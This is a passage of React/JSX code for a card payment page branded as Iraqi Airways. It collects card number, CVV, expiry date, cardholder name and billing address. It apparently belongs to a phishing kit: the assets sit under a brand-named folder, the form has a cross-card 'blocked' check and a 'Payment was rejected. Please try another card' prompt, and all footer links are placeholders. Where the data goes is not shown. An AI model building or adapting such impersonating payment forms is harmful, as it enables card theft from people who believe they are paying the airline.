                  <div className="relative z-10 p-5 flex flex-col justify-between h-full">
                    {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="absolute top-3 right-3 h-8" />}
                    <p className="text-lg tracking-widest font-mono mt-8" dir="ltr">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
                    <div className="flex justify-between text-xs">
                      <div><p className="opacity-70">{isAr ? 'اسم حامل البطاقة' : 'Cardholder name'}</p><p>{nameOnCard || 'XXX'}</p></div>
                      <div><p className="opacity-70">{isAr ? 'تاريخ الانتهاء' : 'Expiration date'}</p><p>{expiryDate || 'XXX'}</p></div>
                    </div>
                  </div>
                </div>

                {/* Card type + Card number */}
                <div className="cc-card-fields flex-1 min-w-0 space-y-3 w-full">
                  <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'نوع البطاقة*' : 'Card type*'}</legend>
                    <select value={selectedCardType} onChange={(e) => setSelectedCardType(e.target.value)} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                      <option value="">{isAr ? 'اختر نوع البطاقة' : 'Select card type'}</option>
                      <option value="Visa">Visa</option>
                      <option value="MasterCard">MasterCard</option>
                    </select>
                  </fieldset>
                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رقم البطاقة*' : 'Card number*'}</legend>
                    <div className="flex items-center w-full">
                      <input type="text" inputMode="numeric" placeholder={isAr ? 'رقم بطاقتك الائتمانية' : 'Your credit card number'} {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
                      {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="h-7" />}
                    </div>
                  </fieldset>
                  {luhnError && <p className="text-red-500 text-xs">{isAr ? 'رقم بطاقة غير صالح' : 'Invalid card number'}</p>}
                  {cardError && <p className="text-red-500 text-xs">{isAr ? 'هذه البطاقة غير مقبولة' : 'This card is not accepted'}</p>}
                  {globalBlockedError && <p className="text-red-500 text-xs">{isAr ? 'تم حظر هذه البطاقة' : 'This card has been blocked'}</p>}
                  {rejectedError && <p className="text-red-500 text-xs">{isAr ? 'تم رفض عملية الدفع. يرجى تجربة بطاقة أخرى.' : 'Payment was rejected. Please try another card.'}</p>}
                </div>
              </div>

              {/* All fields below - same width as Card type column on desktop, full width on mobile */}
              <div className={`cc-fields-below mt-3 sm:ml-[280px]`}>

              {/* Expiry + CVV */}
              <div className="cc-expiry-cvv flex flex-wrap sm:flex-nowrap gap-3 items-start">
                <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${expiryError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                  <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'تاريخ الانتهاء*' : 'Expiry date*'}</legend>
                  <div className="flex items-center w-full" dir="ltr">
                    <input id="expiry-month" type="text" inputMode="numeric" placeholder="MM" value={expiryMonth} 
                      onChange={(e) => { 
                        const v = e.target.value.replace(/\D/g,'').slice(0,2); 
                        setExpiryMonth(v); 
                        if (v.length === 2) document.getElementById('expiry-year')?.focus();
                      }} 
                      className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
                    <span className="text-gray-400 mx-1">/</span>
                    <input id="expiry-year" type="text" inputMode="numeric" placeholder="YY" value={expiryYear} 
                      onChange={(e) => setExpiryYear(e.target.value.replace(/\D/g,'').slice(0,2))} 
                      className="w-10 bg-transparent text-gray-700 focus:outline-none text-[15px] text-center" />
                  </div>
                </fieldset>

                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${errors.cvv ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رمز الأمان (CVV)*' : 'CVV*'}</legend>
                    <div className="flex items-center w-full">
                      <input type="text" inputMode="numeric" placeholder="123" {...register("cvv", { onChange: (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); } })} maxLength={3} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
                      <svg className="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    </div>
                  </fieldset>
              </div>

              {/* Name on card */}
                <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center mt-3 ${errors.nameOnCard ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                  <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الاسم على البطاقة*' : 'Name on card*'}</legend>
                  <input type="text" placeholder={isAr ? 'الاسم كما هو مكتوب على البطاقة' : 'Name as it appears on the card'} {...register("nameOnCard", { onChange: (e) => { e.target.value = e.target.value.replace(/[^A-Za-z '\u0027-]/g, ''); } })} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
                </fieldset>

              {/* Billing Address Section */}
              <div className="mt-8">
                <h3 className={`text-[#2E7D32] font-bold mb-4 ${isAr ? 'text-right' : 'text-left'}`}>{isAr ? 'عنوان الفوترة' : 'Billing Address'}</h3>
                <div className="space-y-3">
                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.street ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'اسم الشارع ورقم المنزل*' : 'Number and street name*'}</legend>
                    <input type="text" placeholder={isAr ? 'أدخل اسم الشارع ورقم المنزل' : 'Enter a number and street name'} {...register("street")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                  </fieldset>

                  <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'شقة، مبنى، طابق، إلخ (اختياري)' : 'Apartment, building, floor, etc. (optional)'}</legend>
                    <input type="text" placeholder={isAr ? 'أدخل الشقة، المبنى، الطابق، إلخ' : 'Enter an apartment, building, floor, etc.'} {...register("apartment")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                  </fieldset>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.city ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'المدينة*' : 'Town/City*'}</legend>
                      <input type="text" placeholder={isAr ? 'أدخل المدينة' : 'Enter a town or city'} {...register("city")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                    </fieldset>
                    <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الولاية/المنطقة (اختياري)' : 'State/Region (optional)'}</legend>
                      <input type="text" placeholder={isAr ? 'أدخل الولاية أو المنطقة' : 'Enter a state or region'} {...register("state")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                    </fieldset>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.postcode ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الرمز البريدي*' : 'Postcode/ZIP code*'}</legend>
                      <input type="text" placeholder={isAr ? 'أدخل الرمز البريدي' : 'Enter a postcode or ZIP code'} {...register("postcode")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
                    </fieldset>
                    
                    {/* Country Dropdown */}
                    <fieldset ref={countryDropdownRef} className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center relative" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الدولة/المنطقة*' : 'Country/Region*'}</legend>
                      <div className="flex items-center cursor-pointer w-full h-full" onClick={() => setCountryOpen(!countryOpen)}>
                        <div className="flex items-center flex-1">
                          <img src={`https://flagcdn.com/20x15/${selectedCountry.code}.png`} alt="" className={`${isAr ? 'ml-2' : 'mr-2'} w-5 h-4`} />
                          <span className="text-gray-700 text-[15px]">{isAr ? selectedCountry.ar : selectedCountry.en}</span>
                        </div>
                        <span className="text-gray-400">▼</span>
                      </div>
                      {countryOpen && (
                        <div className="absolute left-0 right-0 top-full mt-1 bg-white border border-[#4CAF50] rounded shadow-lg z-50 max-h-60 overflow-y-auto">
                          <div className="sticky top-0 bg-white p-2 border-b" onClick={(e) => e.stopPropagation()}>
                            <input 
                              type="text" 
                              placeholder={isAr ? "بحث..." : "Search..."} 
                              value={countrySearch} 
                              onChange={(e) => setCountrySearch(e.target.value)} 
                              className="w-full border border-gray-300 rounded px-2 py-1 text-sm focus:outline-none focus:border-[#4CAF50]" 
                              autoFocus 
                            />
                          </div>
                          {filteredCountries.map(c => (
                            <div key={c.code} className="flex items-center px-3 py-2 hover:bg-[#e8f5e9] cursor-pointer" onClick={() => { setSelectedCountry(c); setCountryOpen(false); setCountrySearch(''); }}>
                              <img src={`https://flagcdn.com/20x15/${c.code}.png`} alt="" className={`${isAr ? 'ml-2' : 'mr-2'} w-5 h-4`} />
                              <span className="text-sm text-gray-700">{isAr ? c.ar : c.en}</span>
                            </div>
                          ))}
                        </div>
                      )}
                    </fieldset>
                  </div>
                </div>
              </div>

              {/* Pay button */}
              <button
                type="submit"
                disabled={!isFormValid}
                className={`w-full mt-8 py-4 rounded-full text-lg font-bold transition-all ${
                  isFormValid ? "bg-[#1B5E20] text-white hover:bg-[#0D3B0F] shadow-lg" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {isAr ? `دفع IQD ${displayAmountStr}` : `Pay IQD ${displayAmountStr}`}
              </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#4ca42c] text-white mt-auto">
        <div className="max-w-7xl mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className={isAr ? 'text-right' : 'text-left'}>
              <h4 className="font-bold mb-4">{isAr ? 'الخطوط الجوية العراقية' : 'Iraqi Airways'}</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">{isAr ? 'من نحن' : 'About us'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'اتصل بنا' : 'Contact us'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'الأسطول' : 'Fleet'}</a></li>
              </ul>
            </div>
            <div className={isAr ? 'text-right' : 'text-left'}>
              <h4 className="font-bold mb-4">{isAr ? 'التخطيط والحجز' : 'Plan & Book'}</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">{isAr ? 'احجز رحلة' : 'Book a flight'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'حالة الرحلة' : 'Flight status'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'الوجهات' : 'Destinations'}</a></li>
              </ul>
            </div>
            <div className={isAr ? 'text-right' : 'text-left'}>
              <h4 className="font-bold mb-4">{isAr ? 'قانوني' : 'Legal'}</h4>
              <ul className="text-sm space-y-2">
                <li><a href="#" className="hover:underline">{isAr ? 'سياسة الخصوصية' : 'Privacy Policy'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'الشروط والأحكام' : 'Terms & Conditions'}</a></li>
                <li><a href="#" className="hover:underline">{isAr ? 'مسؤولية الناقل' : 'Carrier\'s liability'}</a></li>
              </ul>
            </div>
            <div className={isAr ? 'text-right' : 'text-left'}>
              <h4 className="font-bold mb-4">{isAr ? 'تابعنا' : 'Follow us'}</h4>
              <div className="flex gap-4">
                <span className="cursor-pointer hover:opacity-80">FB</span>
                <span className="cursor-pointer hover:opacity-80">TW</span>
                <span className="cursor-pointer hover:opacity-80">IG</span>
              </div>
            </div>
          </div>
          <div className="mt-8 pt-8 border-t border-white/20 text-center text-xs">
            <p dir="ltr">&copy; 2026 {isAr ? 'الخطوط الجوية العراقية. جميع الحقوق محفوظة.' : 'Iraqi Airways. All rights reserved.'}</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
